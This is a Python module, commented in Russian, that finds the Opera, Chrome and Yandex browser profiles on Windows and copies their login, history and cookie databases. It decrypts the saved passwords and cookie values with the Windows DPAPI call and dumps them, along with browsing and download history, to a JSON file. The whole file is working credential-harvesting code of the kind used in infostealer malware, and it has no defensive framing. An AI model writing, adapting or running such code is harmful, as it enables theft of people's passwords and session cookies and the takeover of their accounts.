import datetime
import json
import os
import shutil
import sqlite3

from win32crypt import CryptUnprotectData as UncryptPass

from additional import make_folders
from error_log import ErrorLog


# Функция для преобразования таймштампов в читаемый вид
def from_timestamp(timestamp):
    return str(datetime.datetime.fromtimestamp((timestamp / 1000000 - 11644473600) // 1))


# Преобразование размера в читаемый вид
def user_friendly_size(size):
    suffix_set = ['bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']
    level = 0
    while size > 1024:
        level += 1
        size = size / 1024
    suffix = suffix_set[level]
    if level != 0: size = f'{size:.2f}'
    return f'{size} {suffix}'


# Основной класс модуля
class BrowserData:
    # SQL-запросы для получения паролей, историю просмотра и скачиваний
    commands = {
        "passwords": "SELECT origin_url, username_value, password_value FROM 'logins';",
        "downloads": "SELECT target_path, total_bytes, site_url, tab_url, mime_type FROM 'downloads';",
        "history": "SELECT url, title, visit_count, last_visit_time FROM 'urls';",
        "cookies": "SELECT host_key, name, encrypted_value FROM 'cookies';"
    }

    def __init__(self):
        # лог ошибок
        self.error_log = ErrorLog()
        # Список браузеров для которых ведется поиск данных
        self.browsers = [
            # {'name' - название браузера,
            # 'path' - список папок к данным (после AppData),
            # 'data': файл Login Data,
            # 'history': файл с историей}
            {
                'name': 'Opera',
                'path': ['Roaming', 'Opera Software', 'Opera Stable'],
                'data': 'Login Data',
                'history': 'History',
                'cookies': 'Cookies'},
            {
                'name': 'Google',
                'path': ['Local', 'Google', 'Chrome', 'User Data', 'Default'],
                'data': 'Login Data',
                'history': 'History',
                'cookies': 'Cookies'},
            {
                'name': 'Yandex',
                'path': ['Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default'],
                'data': 'Ya Login Data',
                'history': 'History',
                'cookies': 'Cookies'}]
        # переменная для дампа данных
        self.records = {}
        self.fill_data()

    # Функция по сборке пути
    @staticmethod
    def make_path(dirs):
        # путь до AppData + path из инициализации браузера
        paths = [os.path.expanduser('~'), 'AppData'] + [folder for folder in dirs]
        result = ''
        # Объединение путей в одну строку
        for path in paths:
            result = os.path.join(result, path)
        return result

    # функция заполнения данных
    def fill_data(self):
        # Для каждого браузера
        for browser in self.browsers:
            try:
                # запускаем функцию копирования бд и получения информации
                browser_data = self.copy_and_get(self.make_path(browser['path']), browser['data'], browser['history'],
                                                 browser['cookies'])
                # обновляем список записей
                self.records.update({browser['name']: browser_data})
            except Exception as e:
                # если какая-то ошибка, то добавляем ее в лог
                self.error_log.add('BrowserData (fill_data)', e)

    # функция копирования бд и получения данных
    def copy_and_get(self, path, login_data='Login Data', history='History', cookies='Cookies'):
        # если папка браузера существует, то
        if os.path.exists(path):
            records = {}
            # проходим по списку файлов [login_data, history] с дополнительными параметрами поиска данных
            for part_data in [(login_data, 'passwords'), (history, 'history', 'downloads'), (cookies, 'cookies')]:
                try:
                    # Получаем оригинальный файл
                    original_file = os.path.join(path, part_data[0])
                    # получаем конечный файл
                    copy_file = f'{original_file}_copy'
                    # копируем в резервный файл
                    shutil.copy(original_file, copy_file)
                    # обновляем записи и запускаем сборщик данных для резервного файла с параметрами поиска
                    records.update(self.get_data_engine(copy_file, *part_data[1:]))
                except Exception as e:
                    self.error_log.add('BrowserData (copy_and_get)', e)
            return records
        return None

    def get_data_engine(self, path, *modes):
        records = {}
        try:
            # Пробуем подключиться к базе
            conn = sqlite3.connect(path)
            # ставим курсор
            cursor = conn.cursor()
            # для каждого режима ([passwords] или  [history, downloads])
            for mode in modes:
                # запускаем функцию выполнения команд
                records.update({mode: self.get_data(cursor, mode)})
            # закрываем соединение
            conn.close()
        except Exception as e:
            self.error_log.add(f'BrowserData (get_data)', e)
        return records

    # функция исполнения команд и получения искомых структур
    def get_data(self, cursor, mode):
        # выполнение команды
        cursor.execute(BrowserData.commands[mode])
        # в зависимости от режима возврат нужной структуры
        if mode == 'history':
            # + преобразование timestamp в читаемую дату
            return [{'url': url, 'title': title, 'visit_count': visit_count, 'last_visit_timestamp': last_visit_time,
                     'last_visit_time': from_timestamp(last_visit_time)}
                    for url, title, visit_count, last_visit_time in cursor.fetchall()]
        elif mode == 'downloads':
            # + преобразование размера в читаемый вид
            return [{'target_path': target_path, 'total_bytes': total_bytes, 'size': user_friendly_size(total_bytes),
                     'site_url': site_url, 'tab_url': tab_url, 'mime_type': mime_type}
                    for target_path, total_bytes, site_url, tab_url, mime_type in cursor.fetchall()]
        elif mode == 'passwords':
            # + расшифровка пароля
            return [{"url": site, "login": login, "password": BrowserData.get_pwd(password)}
                    for site, login, password in cursor.fetchall()]
        elif mode == 'cookies':
            return self.get_cookies(cursor.fetchall())

    def get_cookies(self, cookie_list):
        organize_cookies = {}
        try:
            for cookie in [{'site': host_key, 'name': name, 'value': self.get_pwd(encrypted_value)}
                           for host_key, name, encrypted_value in cookie_list]:
                if cookie['site'] not in organize_cookies:
                    organize_cookies[cookie['site']] = {}
                organize_cookies[cookie['site']].update({cookie['name']: cookie['value']})
        except Exception as e:
            self.error_log.add('BrowserData (get_cookies)', e)
        return organize_cookies

    # функция расшифровки пароля
    @staticmethod
    def get_pwd(password):
        try:
            # с помощью функции UncryptPass
            return UncryptPass(password)[1].decode('utf-8')
        except:
            # если не получилось, то сообщаем об этом и копируем зашифрованный пароль
            return f"(NOT DECRYPT) {password.decode('utf-8')}"

    # сохранение всех записей в файл
    def save_data(self, filename):
        with open(filename, 'w') as data_file:
            json.dump(self.records, data_file)


def browser_data_manager(config):
    browser_data = BrowserData()
    make_folders(config['filename'])
    browser_data.save_data(config['filename'])
    browser_data.error_log.save_log(config['errors_log'])


if __name__ == '__main__':
    try:
        # Для изменения конфигурации "на лету" настройки будем получать из файла
        with open('config.json', 'r') as config_file:
            bd_config = json.load(config_file)
            # Запуск механизма с загруженными настройками
            browser_data_manager(bd_config)
    except Exception as e:
        print(e)
